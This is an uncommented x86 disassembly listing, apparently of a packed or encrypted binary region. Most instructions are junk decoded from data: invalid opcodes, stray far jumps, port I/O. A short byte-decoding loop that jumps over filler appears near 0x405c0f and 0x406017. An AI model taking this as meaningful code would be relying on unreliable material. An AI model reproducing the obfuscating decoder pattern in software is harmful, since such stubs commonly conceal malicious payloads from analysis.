  405a63:	rcl    ah,cl
  405a65:	loop   0x405ad6
  405a67:	sar    BYTE PTR [edx+0x21],0x29
  405a6b:	add    eax,0x593ed162
  405a70:	(bad)  
  405a71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a72:	jns    0x405a21
  405a74:	mov    eax,ds:0xe35e3e26
  405a79:	sbb    al,0x98
  405a7b:	cmp    al,0x1d
  405a7d:	lock jmp 0x405aab
  405a80:	outs   dx,DWORD PTR ds:[esi]
  405a81:	ins    BYTE PTR es:[edi],dx
  405a82:	push   ss
  405a83:	pop    ss
  405a84:	scas   al,BYTE PTR es:[edi]
  405a85:	pusha  
  405a86:	sbb    DWORD PTR [ecx],ebx
  405a88:	cld    
  405a89:	repnz mov BYTE PTR [eax+ebp*4-0x7b],bh
  405a8e:	cmp    BYTE PTR [edi],bh
  405a90:	rcr    DWORD PTR [ebx+0x2a],cl
  405a93:	cmp    edx,DWORD PTR [esp+eax*4+0x5e81c764]
  405a9a:	std    
  405a9b:	sbb    ah,BYTE PTR ds:0xd4d5974c
  405aa1:	rol    BYTE PTR [ecx-0x9],0x52
  405aa5:	push   cs
  405aa6:	and    al,0x2
  405aa8:	mov    dh,0x57
  405aaa:	mov    edx,0xb8cfdf78
  405aaf:	or     bh,BYTE PTR [edx+0x2c]
  405ab2:	jbe    0x405ae3
  405ab4:	cmp    DWORD PTR [edx],edi
  405ab6:	(bad)  
  405ab8:	outs   dx,DWORD PTR ds:[esi]
  405ab9:	mov    WORD PTR [ebx],ss
  405abb:	outs   dx,BYTE PTR ds:[esi]
  405abc:	mov    bh,0x22
  405abe:	ds jl  0x405aff
  405ac1:	neg    BYTE PTR [ebx+0x1cdd666a]
  405ac7:	push   esp
  405ac8:	xchg   esp,eax
  405ac9:	stc    
  405aca:	stos   DWORD PTR es:[edi],eax
  405acb:	ret    
  405acc:	pop    edi
  405acd:	jecxz  0x405b17
  405acf:	or     ebx,eax
  405ad1:	adc    BYTE PTR [eax+0x6c],0x13
  405ad5:	add    al,0xa
  405ad7:	push   0xffffffaa
  405ad9:	mov    ?,ebx
  405adb:	mov    ebx,0xeea79e34
  405ae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ae1:	xchg   ebp,eax
  405ae2:	das    
  405ae3:	adc    al,BYTE PTR [ebx-0x2ffc160a]
  405ae9:	mov    esp,0x60cea833
  405aee:	sub    ecx,ebx
  405af0:	loope  0x405ad1
  405af2:	(bad)  
  405af3:	rcl    DWORD PTR [ecx+ebp*1],0x29
  405af7:	arpl   WORD PTR [esi],bp
  405af9:	pop    esp
  405afa:	pop    edi
  405afb:	lock sbb bh,bl
  405afe:	loope  0x405af2
  405b00:	add    ebp,DWORD PTR [ebx+ebp*8+0x737482d6]
  405b07:	dec    edi
  405b08:	mov    edx,0xee6981fd
  405b0d:	stos   BYTE PTR es:[edi],al
  405b0e:	fnsave [ebp-0xc6dd149]
  405b14:	mov    ah,0xb0
  405b16:	mov    ecx,0x996556a3
  405b1b:	scas   eax,DWORD PTR es:[edi]
  405b1c:	sbb    BYTE PTR [ebp+0x6524dfb3],0x6d
  405b23:	out    dx,al
  405b24:	mov    ds:0x67bd0831,eax
  405b29:	pop    esi
  405b2a:	push   ebx
  405b2b:	pop    esi
  405b2c:	push   ecx
  405b2d:	push   ebp
  405b2e:	push   ecx
  405b2f:	test   al,0x20
  405b31:	out    0x75,eax
  405b33:	mov    cl,0x53
  405b35:	mov    WORD PTR [ecx-0x924d453],?
  405b3b:	push   ebx
  405b3c:	jne    0x405b8f
  405b3e:	and    DWORD PTR [edx+0x5d],ebp
  405b41:	add    al,0x9b
  405b43:	sub    BYTE PTR [edx-0x5b3a06ee],bl
  405b49:	les    ecx,FWORD PTR [esi-0x453cf693]
  405b4f:	(bad)  
  405b50:	xchg   edx,eax
  405b51:	adc    eax,0x146017e7
  405b56:	inc    ebp
  405b57:	xchg   ecx,eax
  405b58:	hlt    
  405b59:	add    al,BYTE PTR [esi+ebx*4]
  405b5c:	loopne 0x405b82
  405b5e:	sbb    al,0x61
  405b60:	inc    edx
  405b61:	out    0x80,al
  405b63:	inc    edx
  405b64:	popf   
  405b65:	and    DWORD PTR [ecx+0x10],0xffffffe9
  405b69:	adc    ebx,DWORD PTR [ebx]
  405b6b:	add    bh,BYTE PTR [eax+0x2722b36]
  405b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b72:	add    eax,0xb9c8c39b
  405b77:	cs pop ds
  405b79:	sahf   
  405b7a:	adc    BYTE PTR [ebx],dh
  405b7c:	jg     0x405bae
  405b7e:	inc    eax
  405b7f:	scas   al,BYTE PTR es:[edi]
  405b80:	in     eax,0x1a
  405b82:	outs   dx,BYTE PTR ds:[esi]
  405b83:	push   ecx
  405b84:	mov    dh,0x32
  405b86:	ret    0xe7fe
  405b89:	push   0xfffffff5
  405b8b:	jae    0x405b6b
  405b8d:	jmp    0x3196:0x6ff5b2e8
  405b94:	ret    
  405b95:	js     0x405c08
  405b97:	xor    WORD PTR [edx],dx
  405b9a:	mov    ds,WORD PTR [edx+0x7e046a2c]
  405ba0:	cs pop ss
  405ba2:	or     BYTE PTR [ebp-0x68],bh
  405ba5:	popf   
  405ba6:	xchg   BYTE PTR [ecx],ch
  405ba8:	fwait
  405ba9:	jmp    0x67de:0x9fe4a549
  405bb0:	mov    ebx,0x8b8ca221
  405bb5:	sub    BYTE PTR [edi],0x2c
  405bb8:	add    esp,esp
  405bba:	dec    ebx
  405bbb:	out    dx,eax
  405bbc:	xchg   edi,esi
  405bbe:	inc    eax
  405bbf:	cwde   
  405bc0:	and    DWORD PTR ds:0xc7903b84,edi
  405bc6:	pop    ebp
  405bc7:	inc    eax
  405bc8:	repnz xchg edx,eax
  405bca:	add    ebp,ecx
  405bcc:	fld    QWORD PTR [eax-0x89d9fa7]
  405bd2:	push   cs
  405bd3:	xor    esp,DWORD PTR [edx]
  405bd5:	repz pushf 
  405bd7:	push   cs
  405bd8:	jge    0x405b7f
  405bda:	fsubr  DWORD PTR [edi+ebx*4-0x3a6d7e5a]
  405be1:	clc    
  405be2:	dec    esp
  405be3:	stc    
  405be4:	or     al,0x32
  405be6:	mov    es,WORD PTR [esi-0x5723871d]
  405bec:	and    BYTE PTR [eax-0x37f29e31],0xe7
  405bf3:	mov    eax,ds:0xdf66c778
  405bf8:	mov    bl,0xe8
  405bfa:	shl    esi,cl
  405bfc:	sti    
  405bfd:	sbb    al,0x70
  405bff:	pushf  
  405c00:	pop    ss
  405c01:	stos   BYTE PTR es:[edi],al
  405c02:	mov    cl,0x13
  405c04:	gs mov edx,0xe63a0a27
  405c0a:	std    
  405c0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c0c:	push   esi
  405c0d:	xchg   edx,eax
  405c0e:	(bad)  
  405c0f:	sub    edi,eax
  405c11:	add    edi,DWORD PTR [ebp+0x10]
  405c14:	xor    edx,ecx
  405c16:	add    edx,esi
  405c18:	cmp    edx,edi
  405c1a:	ja     0x406428
  405c20:	push   ebx
  405c21:	jmp    0x405c2b
  405c26:	mov    esi,0x32729d
  405c2b:	mov    eax,DWORD PTR [ebp-0x8]
  405c2e:	mov    edi,DWORD PTR [ebp-0x4]
  405c31:	xor    edi,ecx
  405c33:	jmp    0x40600f
  405c38:	test   DWORD PTR [edx-0x7c],0x79ec5dea
  405c3f:	arpl   WORD PTR ds:0x205d0ed0,dx
  405c45:	cwde   
  405c46:	jmp    0xbd7e:0x7e3b50c6
  405c4d:	jno    0x405ccd
  405c4f:	jle    0x405c00
  405c51:	or     al,0x6c
  405c53:	fwait
  405c54:	or     dl,BYTE PTR [edx]
  405c56:	dec    esp
  405c57:	adc    DWORD PTR [edx+ecx*4+0x270a50b7],edx
  405c5e:	retf   0x5eaa
  405c61:	xchg   ebp,eax
  405c62:	jge    0x405be7
  405c64:	enter  0x6380,0xcc
  405c68:	jp     0x405c7e
  405c6a:	sti    
  405c6b:	retf   
  405c6c:	je     0x405c0a
  405c6e:	or     al,0xdd
  405c70:	inc    esi
  405c71:	aam    0x2b
  405c73:	add    cl,BYTE PTR [esi-0x80]
  405c76:	test   eax,0xffda647a
  405c7b:	loopne 0x405c30
  405c7d:	ret    
  405c7e:	icebp  
  405c7f:	inc    esp
  405c80:	pop    esi
  405c81:	xchg   edx,eax
  405c82:	push   edi
  405c83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c84:	add    cl,BYTE PTR [ebx+0x69]
  405c87:	cdq    
  405c88:	push   edx
  405c89:	mov    bh,0xa6
  405c8b:	repnz push es
  405c8d:	mov    bl,0x97
  405c8f:	pop    edi
  405c90:	ss in  eax,0xe1
  405c93:	cwde   
  405c94:	pop    ecx
  405c95:	adc    al,0xfb
  405c97:	repnz mov ds:0xff5e45eb,eax
  405c9d:	sbb    eax,0x2271a6f
  405ca2:	sar    esi,1
  405ca4:	ficomp DWORD PTR [ecx]
  405ca6:	pop    es
  405ca7:	mov    eax,esi
  405ca9:	or     al,0xff
  405cab:	and    al,0xf
  405cad:	sbb    al,BYTE PTR [eax+0x6dd4ffc6]
  405cb3:	cmp    ah,al
  405cb5:	in     eax,dx
  405cb6:	loopne 0x405c5d
  405cb8:	push   edi
  405cb9:	jnp    0x405cfa
  405cbb:	xor    al,0x8a
  405cbd:	fwait
  405cbe:	(bad)  
  405cbf:	js     0x405cf6
  405cc1:	ret    0xea9b
  405cc4:	fiadd  DWORD PTR [edi-0x38]
  405cc7:	loopne 0x405d1a
  405cc9:	lahf   
  405cca:	sbb    BYTE PTR [ebx-0x12131189],0xb0
  405cd1:	call   0x2272fb83
  405cd6:	bound  edx,QWORD PTR [ebp+0x5f]
  405cd9:	inc    ecx
  405cda:	lods   al,BYTE PTR ds:[esi]
  405cdb:	shl    eax,0xc1
  405cde:	sbb    BYTE PTR ds:0xdc6dea62,dh
  405ce4:	fcomp  DWORD PTR [ecx-0x32]
  405ce7:	xchg   ecx,eax
  405ce8:	bound  edx,QWORD PTR [ecx]
  405cea:	popf   
  405ceb:	pop    ds
  405cec:	mov    eax,0xc1a4f3ed
  405cf1:	cmp    edx,DWORD PTR [ebp-0xca76b13]
  405cf7:	or     ecx,DWORD PTR [esi+eiz*1]
  405cfa:	xchg   DWORD PTR [ecx+0x279a728e],ebx
  405d00:	repz sbb al,0x1
  405d03:	nop
  405d04:	mov    ebx,0x5f0513ea
  405d09:	imul   edi,ecx,0x4c
  405d0c:	inc    ebx
  405d0d:	jns    0x405d15
  405d0f:	xchg   ebp,eax
  405d10:	or     eax,0xb388768
  405d15:	xor    al,0xf
  405d17:	addr16 fcomip st,st(4)
  405d1a:	xor    DWORD PTR [eax-0x398acfbc],ebp
  405d20:	adc    dl,0xbf
  405d23:	xchg   ebp,eax
  405d24:	in     eax,dx
  405d25:	xchg   esp,eax
  405d26:	pop    edx
  405d27:	leave  
  405d28:	mov    ss,ebp
  405d2a:	add    esp,DWORD PTR [ebx-0x20]
  405d2d:	push   edi
  405d2e:	fs (bad) 
  405d30:	sub    eax,DWORD PTR [ecx]
  405d32:	mov    edi,0x47eb0796
  405d37:	pop    ecx
  405d38:	cdq    
  405d39:	push   eax
  405d3a:	test   bh,al
  405d3c:	push   ebx
  405d3d:	mov    edi,DWORD PTR ds:0xa6109f15
  405d43:	xchg   ebp,eax
  405d44:	mov    bh,0xea
  405d46:	add    BYTE PTR [edx+0x58],dh
  405d49:	fistp  DWORD PTR [edx-0x3c]
  405d4c:	push   ss
  405d4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d4e:	das    
  405d4f:	mov    dl,0xbd
  405d51:	or     al,0xf2
  405d53:	xchg   esp,eax
  405d54:	mov    ds:0x6ac0f977,al
  405d59:	xchg   ebx,eax
  405d5a:	jbe    0x405d1a
  405d5c:	cdq    
  405d5d:	xchg   BYTE PTR [ebx+edx*2+0x4b],ah
  405d61:	sbb    dh,BYTE PTR [ebp+0x6f]
  405d64:	add    DWORD PTR [eax],edx
  405d66:	inc    ebx
  405d67:	and    al,0x43
  405d69:	jbe    0x405d4e
  405d6b:	add    eax,0xb895b6f
  405d70:	cmp    eax,0xe57e384d
  405d75:	icebp  
  405d76:	mov    esp,0xdc0557b6
  405d7b:	dec    esi
  405d7c:	retf   0x1fed
  405d7f:	jg     0x405d65
  405d81:	jmp    0x405d1b
  405d83:	inc    ebp
  405d84:	pop    eax
  405d85:	iret   
  405d86:	jl     0x405df9
  405d88:	iret   
  405d89:	ins    DWORD PTR es:[edi],dx
  405d8a:	clc    
  405d8b:	scas   eax,DWORD PTR es:[edi]
  405d8c:	iret   
  405d8d:	mov    BYTE PTR [edx],0x9d
  405d90:	push   edx
  405d91:	cdq    
  405d92:	mov    ebx,0x2e68133d
  405d97:	mov    es,esi
  405d99:	out    dx,al
  405d9a:	mov    esp,0xfde3fd71
  405d9f:	xchg   esi,eax
  405da0:	and    edx,esi
  405da2:	add    cl,ah
  405da4:	inc    ebx
  405da5:	shr    DWORD PTR [ecx+eax*4],0x6a
  405da9:	out    dx,al
  405daa:	sub    eax,0x41f4e237
  405daf:	mov    eax,ds:0x6d2cb7fa
  405db4:	int3   
  405db5:	push   eax
  405db6:	lea    esp,[ebx]
  405db8:	inc    edx
  405db9:	js     0x405dae
  405dbb:	add    al,0x8c
  405dbd:	(bad)  
  405dbe:	call   0xb283:0xf40928e7
  405dc5:	xchg   esi,eax
  405dc6:	sahf   
  405dc7:	fnstsw WORD PTR [edi-0x3cf19d8d]
  405dcd:	call   0xe187:0xb5910132
  405dd4:	imul   ch
  405dd6:	sub    al,0xed
  405dd8:	ss popf 
  405dda:	add    edx,DWORD PTR [eax+ecx*8]
  405ddd:	call   0x3623:0x9e26b73b
  405de4:	jmp    ebx
  405de6:	push   ds
  405de7:	test   eax,0x78fcee9a
  405dec:	push   es
  405ded:	mov    ecx,0x40e7767a
  405df2:	and    eax,0xdf3ab758
  405df7:	pop    esp
  405df8:	arpl   bp,bp
  405dfa:	stc    
  405dfb:	lock sbb al,0x2
  405dfe:	pop    esi
  405dff:	pushf  
  405e00:	stc    
  405e01:	add    edx,DWORD PTR [edi]
  405e03:	lea    ebx,[esi]
  405e05:	mov    ch,0x34
  405e07:	add    BYTE PTR [edx+0x212b0ab2],cl
  405e0d:	aam    0x2f
  405e0f:	push   ds
  405e10:	cmp    al,0x20
  405e12:	push   cs
  405e13:	enter  0x76c0,0xde
  405e17:	int    0xdb
  405e19:	adc    dh,ch
  405e1b:	rcl    dl,cl
  405e1d:	in     eax,0xba
  405e1f:	je     0x405e82
  405e21:	mov    bh,0x2b
  405e23:	dec    eax
  405e25:	or     ch,ah
  405e27:	stc    
  405e28:	dec    edi
  405e2a:	in     al,0x2c
  405e2c:	lahf   
  405e2d:	fsub   QWORD PTR [ecx+edx*2]
  405e30:	ficom  WORD PTR [ecx]
  405e32:	mov    eax,0x478117a7
  405e37:	ins    BYTE PTR es:[edi],dx
  405e38:	loope  0x405eaf
  405e3a:	(bad)  
  405e3b:	xor    BYTE PTR [edx-0x38],al
  405e3e:	xor    edi,DWORD PTR [esi-0x28]
  405e41:	sahf   
  405e42:	aam    0x52
  405e44:	push   edi
  405e45:	dec    eax
  405e46:	cmc    
  405e47:	cli    
  405e48:	cmp    eax,0xff30155c
  405e4d:	sub    bl,BYTE PTR [edx+0x56]
  405e50:	add    ah,BYTE PTR [edi+0x1638aafc]
  405e56:	retf   0x467d
  405e59:	sar    DWORD PTR [eax],1
  405e5b:	jbe    0x405ed8
  405e5d:	(bad)  
  405e5f:	pop    ss
  405e60:	ror    DWORD PTR [eax-0x54],0x31
  405e64:	ja     0x405dfc
  405e66:	sub    BYTE PTR [ebx],cl
  405e68:	dec    esi
  405e69:	fist   DWORD PTR [ebp+0x7cb9a41c]
  405e6f:	xor    eax,0x7bbf487e
  405e74:	cld    
  405e75:	xchg   DWORD PTR [esi-0x3a],edi
  405e78:	call   0xec3cb02d
  405e7d:	and    DWORD PTR [ecx],edi
  405e7f:	pop    edx
  405e80:	xchg   ecx,eax
  405e81:	cs xor al,0x7d
  405e84:	fnstenv [ebx+ecx*2]
  405e87:	add    BYTE PTR [ecx+0x3bd25e81],cl
  405e8d:	mov    al,ds:0xb2a6f391
  405e92:	pop    ecx
  405e93:	jp     0x405e9b
  405e95:	mov    eax,0xde0a096b
  405e9a:	xlat   BYTE PTR ds:[ebx]
  405e9c:	in     al,dx
  405e9d:	idiv   esi
  405e9f:	xchg   edi,eax
  405ea0:	mov    ah,0x10
  405ea2:	or     BYTE PTR [esi-0x6b],ah
  405ea5:	dec    eax
  405ea6:	adc    BYTE PTR [edi],al
  405ea8:	sub    edi,DWORD PTR [esi]
  405eaa:	xchg   ebp,eax
  405eab:	and    al,BYTE PTR [ecx-0x9]
  405eae:	jl     0x405e9a
  405eb0:	stc    
  405eb1:	dec    esp
  405eb2:	and    bh,ah
  405eb4:	cld    
  405eb5:	stos   BYTE PTR es:[edi],al
  405eb6:	mov    al,al
  405eb8:	test   BYTE PTR [esi],ch
  405eba:	sbb    eax,0xefea2520
  405ebf:	out    dx,eax
  405ec0:	cwde   
  405ec1:	mov    edx,0xba20a2c8
  405ec6:	or     cl,BYTE PTR [eax+0x421a2763]
  405ecc:	cmc    
  405ecd:	aas    
  405ece:	jo     0x405f28
  405ed0:	cmp    DWORD PTR [edx],eax
  405ed2:	pop    esp
  405ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ed4:	adc    eax,0x221dbd4b
  405ed9:	pusha  
  405eda:	cmp    BYTE PTR [esi],al
  405edc:	push   edx
  405edd:	jns    0x405e7f
  405edf:	jae    0x405f3b
  405ee1:	xchg   esi,eax
  405ee2:	les    edx,FWORD PTR [edx-0x1d]
  405ee5:	sbb    si,WORD PTR [eax-0x2ed69802]
  405eec:	lahf   
  405eed:	mov    BYTE PTR [ebp-0x40],dl
  405ef0:	mov    db0,esp
  405ef3:	sbb    BYTE PTR [ecx+ecx*1-0x24],bh
  405ef7:	and    cl,BYTE PTR [ecx]
  405ef9:	xchg   BYTE PTR [esi],bh
  405efb:	add    BYTE PTR [esi+0x3b],bl
  405efe:	jne    0x405e8a
  405f00:	cld    
  405f01:	xor    eax,0x9e560f7b
  405f06:	jle    0x405f5d
  405f08:	xchg   ecx,eax
  405f09:	lods   eax,DWORD PTR ds:[esi]
  405f0a:	in     al,dx
  405f0b:	jo     0x405f61
  405f0d:	mov    ds:0x7d5cc84,al
  405f12:	int    0x88
  405f14:	pop    edx
  405f15:	int3   
  405f16:	jno    0x405ea9
  405f18:	inc    edx
  405f19:	mov    ch,BYTE PTR [eax+0x1f]
  405f1c:	cmp    eax,0x3df6c84d
  405f21:	(bad)  
  405f22:	clc    
  405f23:	jnp    0x405f15
  405f25:	mov    ds:0xe2303aea,al
  405f2a:	test   cl,bh
  405f2c:	cdq    
  405f2d:	push   0x3e
  405f2f:	std    
  405f30:	sub    esp,DWORD PTR [eax+0x73939f0]
  405f36:	scas   al,BYTE PTR es:[edi]
  405f37:	hlt    
  405f38:	jle    0x405f08
  405f3a:	lods   al,BYTE PTR ds:[esi]
  405f3b:	sahf   
  405f3c:	adc    BYTE PTR [edi-0x146c965f],dh
  405f42:	cli    
  405f43:	iret   
  405f44:	(bad)
  405f47:	dec    ebp
  405f48:	repz das 
  405f4a:	sbb    bh,BYTE PTR [eax+0x6d]
  405f4d:	pop    edi
  405f4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f4f:	sar    BYTE PTR [ebp-0x246f9dcf],1
  405f55:	mov    eax,0xc3faff71
  405f5a:	cdq    
  405f5b:	adc    DWORD PTR [eax+edx*2-0x72d78db0],ebp
  405f62:	inc    edi
  405f63:	fimul  WORD PTR [edx+0x29]
  405f66:	or     BYTE PTR [esi],bh
  405f68:	adc    BYTE PTR es:[edx-0x22],bh
  405f6c:	call   0xb0a9:0x5b93346c
  405f73:	shl    BYTE PTR ds:0x1685d954,0x8a
  405f7a:	cmp    eax,0xbf6ffca2
  405f7f:	jge    0x405fe4
  405f81:	xor    BYTE PTR [eax+0x70],dh
  405f84:	test   BYTE PTR ds:0x30406db,bl
  405f8a:	push   esp
  405f8b:	in     eax,0xac
  405f8d:	push   ds
  405f8e:	sahf   
  405f8f:	pop    esp
  405f90:	add    eax,0x8b9c6950
  405f95:	mov    ecx,0x162fc0ba
  405f9a:	ins    BYTE PTR es:[edi],dx
  405f9b:	pop    eax
  405f9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f9d:	into   
  405f9e:	xor    dl,BYTE PTR [eax+ecx*1+0x637d7209]
  405fa5:	and    esp,ecx
  405fa7:	or     DWORD PTR gs:0x5fc92f1,esi
  405fae:	scas   al,BYTE PTR es:[edi]
  405faf:	or     eax,0x4d7ede22
  405fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fb5:	sub    cl,0xa3
  405fb8:	mov    ds:0x3092fb9b,eax
  405fbd:	loopne 0x405f62
  405fbf:	and    DWORD PTR [eax-0x60],esi
  405fc2:	(bad)
  405fc5:	push   ss
  405fc6:	jmp    FWORD PTR [edi+0x6d794b85]
  405fcc:	aaa    
  405fcd:	xor    DWORD PTR [ebx+0x44],edi
  405fd0:	sub    ebp,DWORD PTR [esi+0x38]
  405fd3:	inc    edx
  405fd4:	cs pop edx
  405fd6:	mov    ecx,0x468f4ba5
  405fdb:	mov    edi,0x767c175f
  405fe0:	in     eax,dx
  405fe1:	pop    esi
  405fe2:	sub    ah,BYTE PTR [edx+0x22556129]
  405fe8:	mov    al,ds:0xc3f33377
  405fed:	pushf  
  405fee:	sub    eax,0x122a4d45
  405ff3:	retf   0xe11
  405ff6:	and    eax,esi
  405ff8:	sub    DWORD PTR [ecx-0x57],edi
  405ffb:	or     BYTE PTR [edx],ch
  405ffd:	xor    BYTE PTR [edx-0x7be9f4c0],0x60
  406004:	xor    BYTE PTR [ecx],cl
  406006:	or     BYTE PTR [edx],ah
  406008:	rcr    DWORD PTR [edi],0x90
  40600b:	mov    ebx,0x399e1b7
  406010:	dec    BYTE PTR [ebx-0x50f0f78b]
  406016:	cli    
  406017:	mov    ebx,DWORD PTR [ebp+0xc]
  40601a:	xor    eax,ecx
  40601c:	add    eax,edx
  40601e:	mov    al,BYTE PTR [ebx+eax*1+0x32729d]
  406025:	mov    BYTE PTR [edi+esi*1],al
  406028:	mov    eax,DWORD PTR [ebp-0x4]
  40602b:	xor    eax,ecx
  40602d:	lea    edx,[edx+eax*1+0x32729d]
  406034:	mov    eax,DWORD PTR [ebp-0x4]
  406037:	xor    eax,ecx
  406039:	mov    esi,0xffcd8d63
  40603e:	sub    esi,eax
  406040:	add    esi,DWORD PTR [ebp+0x10]
  406043:	cmp    edx,esi
  406045:	jmp    0x406421
  40604a:	fdivr  st(7),st
  40604c:	es fwait
  40604e:	jge    0x40600b
  406050:	jge    0x40609b
  406052:	jae    0x4060cf
  406054:	dec    edx
  406055:	pusha  
  406056:	cmc    
  406057:	mov    bl,0xce
  406059:	fs lahf 
  40605b:	aas    
  40605c:	jle    0x4060dc
  40605e:	mov    ebp,0xbc7e7e71
  406063:	jbe    0x405fe7
  406065:	into   
  406066:	sub    DWORD PTR [ebx+eiz*1],ebp
  406069:	push   ebp
  40606a:	push   eax
  40606b:	retf   
  40606c:	pop    ebp
  40606d:	jl     0x4060cf
  40606f:	ror    DWORD PTR [ebx+0x5f],0x51
  406073:	xchg   ebx,eax
  406074:	adc    al,0xe
  406076:	dec    ebx
  406077:	ret    0x25cb
  40607a:	lds    esp,FWORD PTR [edi+0x33]
  40607d:	je     0x406064
  40607f:	xchg   esp,eax
  406080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406081:	jno    0x406074
  406083:	inc    ecx
  406084:	mov    ecx,0x6642f14e
  406089:	push   0x77510255
  40608e:	iret   
  40608f:	ins    BYTE PTR es:[edi],dx
  406090:	cwde   
  406091:	popf   
  406092:	aam    0x64
  406094:	ret    0x8d03
  406097:	das    
  406098:	mov    ecx,0xab4684a8
  40609d:	mov    ecx,0xd9317d82
  4060a2:	std    
  4060a3:	or     eax,0x58fbc8e4
  4060a8:	test   eax,0xe1ed2d99
  4060ad:	mov    cl,dl
  4060af:	mov    ds:0x98413af5,eax
  4060b4:	ins    DWORD PTR es:[edi],dx
  4060b5:	sub    eax,0x167eb74a
  4060ba:	bnd je 0x406050
  4060bd:	push   ecx
  4060be:	xchg   BYTE PTR ds:0x4aca90fc,bh
  4060c4:	outs   dx,DWORD PTR ds:[esi]
  4060c5:	ret    
  4060c6:	or     DWORD PTR [edi+ecx*4],eax
  4060c9:	aaa    
  4060ca:	xchg   ebp,eax
  4060cb:	or     eax,ebp
  4060cd:	or     eax,0x9174eb72
  4060d2:	cld    
  4060d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060d4:	inc    ebx
  4060d5:	nop
  4060d6:	cmc    
  4060d7:	adc    DWORD PTR [eax-0x31],0xc199525
  4060de:	jle    0x406135
  4060e0:	mov    bl,0xd8
  4060e2:	and    ebp,DWORD PTR [edx]
  4060e4:	or     eax,0xc6b2b7ff
  4060e9:	dec    esi
  4060ea:	push   eax
  4060eb:	aad    0xe2
  4060ed:	fnstsw WORD PTR [eax-0x5c]
  4060f0:	xor    dh,cl
  4060f2:	imul   ecx,DWORD PTR [edx],0xc8612d4
  4060f8:	sbb    esi,DWORD PTR [edx-0x1a]
  4060fb:	fisubr WORD PTR [edx+0x606b5979]
  406101:	in     al,dx
  406102:	mov    edi,0x1b48d403
  406107:	mov    edx,0x17470ec5
  40610c:	inc    esi
  40610d:	rcr    DWORD PTR [esi],cl
  40610f:	xor    bl,BYTE PTR [ebx+esi*4-0x2f]
  406113:	adc    BYTE PTR [esi+0x39],dl
  406116:	fisub  DWORD PTR [ebp+0x22fc81ff]
  40611c:	dec    esi
  40611d:	not    DWORD PTR [eax+ecx*1-0x3c]
  406121:	int    0x3b
  406123:	lock rcl DWORD PTR [ebx+0x7d],cl
  406127:	cs mov al,0x19
  40612a:	mov    al,0xd0
  40612c:	(bad)  
  40612e:	out    0x72,eax
  406130:	aas    
  406131:	and    DWORD PTR [ebp-0x5d751095],edi
  406137:	push   es
  406138:	mov    ebp,0xc0b72e8
  40613d:	into   
  40613e:	lahf   
  40613f:	je     0x406150
  406141:	or     ch,bh
  406143:	xor    al,0x1
  406145:	sahf   
  406146:	neg    DWORD PTR [ebp+ebp*8-0x40]
  40614a:	sub    al,0xde
  40614c:	jp     0x406122
  40614e:	mov    ebx,DWORD PTR [esi-0x383f42de]
  406154:	sbb    BYTE PTR [ecx+edx*4-0x4f],bl
  406158:	mov    ds:0x31188333,eax
  40615d:	cmp    al,0x7d
  40615f:	(bad)  
  406160:	add    DWORD PTR [esi-0x5d87c447],edi
  406166:	cs push ss
  406168:	fisttp QWORD PTR ds:[edx+edi*8+0x5e]
  40616d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40616e:	xor    DWORD PTR [eax+0x6],ebx
  406171:	nop
  406172:	push   ebp
  406173:	mov    dh,0xf0
  406175:	and    DWORD PTR [ebx+0x18cae533],edi
  40617b:	xor    esp,eax
  40617d:	ret    
  40617e:	jae    0x4061ba
  406180:	adc    eax,0x9bf0a7da
  406185:	dec    ecx
  406186:	int    0x38
  406188:	fmul   st,st(2)
  40618a:	sub    eax,0x2d7f760d
  40618f:	push   esp
  406190:	stos   BYTE PTR es:[edi],al
  406191:	cmp    dl,al
  406193:	xchg   DWORD PTR [ebx+0x50],eax
  406196:	push   esi
  406197:	ins    DWORD PTR es:[edi],dx
  406198:	pop    esp
  406199:	(bad)
  40619d:	dec    eax
  40619e:	add    BYTE PTR [edi],cl
  4061a0:	dec    esi
  4061a1:	sub    bh,BYTE PTR [edx+0x6434b1e7]
  4061a7:	adc    eax,ebp
  4061a9:	cwde   
  4061aa:	and    edi,ebx
  4061ac:	mov    ecx,0xb56ef45
  4061b1:	fcom   DWORD PTR [edx+0xf]
  4061b4:	cmp    BYTE PTR [eax-0x2c472f22],dh
  4061ba:	and    BYTE PTR [edi-0x61],dl
  4061bd:	mov    ds:0xf6c2981e,al
  4061c2:	xor    ch,BYTE PTR [eax+0x12]
  4061c5:	mov    ebx,0xe1a2031
  4061ca:	stos   DWORD PTR es:[edi],eax
  4061cb:	pop    ss
  4061cc:	xchg   esi,eax
  4061cd:	fadd   QWORD PTR [esi-0x3b80a899]
  4061d3:	jmp    0x397b:0x47693442
  4061da:	imul   ebx,DWORD PTR [edx],0x158bb614
  4061e0:	jo     0x4061d8
  4061e2:	cli    
  4061e3:	popf   
  4061e4:	push   eax
  4061e5:	adc    al,0x65
  4061e7:	and    ah,BYTE PTR [edx-0x1e858ea7]
  4061ed:	hlt    
  4061ee:	add    eax,0x7dad67a0
  4061f3:	test   BYTE PTR [edi],0x3
  4061f6:	jmp    0x2d1d2405
  4061fb:	pop    edi
  4061fc:	out    dx,al
  4061fd:	mov    dh,0xd3
  4061ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406200:	(bad)  
  406202:	adc    ch,ch
  406204:	test   al,0xf7
  406206:	sti    
  406207:	stos   BYTE PTR es:[edi],al
  406208:	push   esp
  406209:	push   0x3e6d8c4c
  40620e:	mov    esp,0xea8afabc
  406213:	repnz nop
  406215:	xor    edi,0xd3f972d1
  40621b:	cwde   
  40621c:	ret    
  40621d:	xchg   DWORD PTR [ebp-0x54],ecx
  406220:	sbb    DWORD PTR [ecx+0x4122f16d],0x6d476668
  40622a:	add    ebx,DWORD PTR [ecx]
  40622c:	fimul  WORD PTR [edi-0x4]
  40622f:	push   cs
